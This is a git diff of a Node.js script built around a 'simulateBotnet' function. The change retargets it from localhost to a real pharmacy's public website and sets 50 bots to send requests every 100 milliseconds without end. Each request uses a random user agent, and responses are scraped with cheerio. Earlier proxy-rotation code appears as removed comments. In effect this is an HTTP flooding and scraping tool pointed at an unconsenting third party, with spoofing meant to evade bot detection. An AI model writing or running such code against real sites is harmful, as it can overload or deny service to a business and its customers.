@@ -1,19 +1,20 @@
 const express = require("express");
 const axios = require("axios");
 const randomUseragent = require("random-useragent");
-const ProxyAgent = require("proxy-agent");
+const cheerio = require("cheerio");
 
 const app = express();
 
 app.use(express.json());
 
 // Main program configuration
-const targetUrl = "http://localhost:4333/bot";
-const numberOfBots = 6;
-// const proxyList = ["http://proxy1.com", "http://proxy2.com"]; // Example proxy list (replace with real proxies)
+const targetUrl = "https://www.thevillagepharmacy.ca/";
 
-// simulate a bot making an HTTP request
-const botRequest = async (targetUrl, proxy) => {
+const numberOfBots = 50;
+let count = 0;
+
+// Simulate a bot making an HTTP request and parse the HTML response
+const botRequest = async (targetUrl) => {
    try {
       const userAgent = randomUseragent.getRandom();
       const config = {
@@ -22,30 +23,43 @@ const botRequest = async (targetUrl, proxy) => {
          },
       };
 
-      //   if (proxy) {
-      //      config.httpAgent = new ProxyAgent(proxy);
-      //   }
-
       const response = await axios.get(targetUrl, config);
 
-      const data = response.data;
+      // Check if request was successful
+      if (response.status === 200) {
+         const html = response.data;
 
-      console.log("data:", data);
-      //   console.log(`Request successful from ${userAgent}: ${response.status}`);
+         // Load the HTML into Cheerio
+         const $ = cheerio.load(html);
+
+         // Example: Extract the page title
+         const pageTitle = $("title").text();
+
+         count++;
+
+         console.log(
+            `Page Title: ${pageTitle}      -----------      count: ${count}`
+         );
+
+         //  // Example: Extract all hyperlinks
+         //  $("a").each((index, element) => {
+         //     const link = $(element).attr("href");
+         //     console.log(`Link ${index + 1}: ${link}`);
+         //  });
+      } else {
+         console.log(`Request failed from ${userAgent}: ${response.status}`);
+      }
    } catch (error) {
       console.log(`Error in bot request: ${error.message}`);
    }
 };
 
-//simulate multiple bots sending requests
-const simulateBotnet = (targetUrl, numberOfBots, proxyList) => {
+// Simulate multiple bots sending requests
+const simulateBotnet = (targetUrl, numberOfBots) => {
    for (let i = 0; i < numberOfBots; i++) {
-      //   const proxy =
-      //      proxyList.length > 0 ? proxyList[i % proxyList.length] : null;
-
       setInterval(() => {
          botRequest(targetUrl);
-      }, 200);
+      }, 100);
    }
 };
 
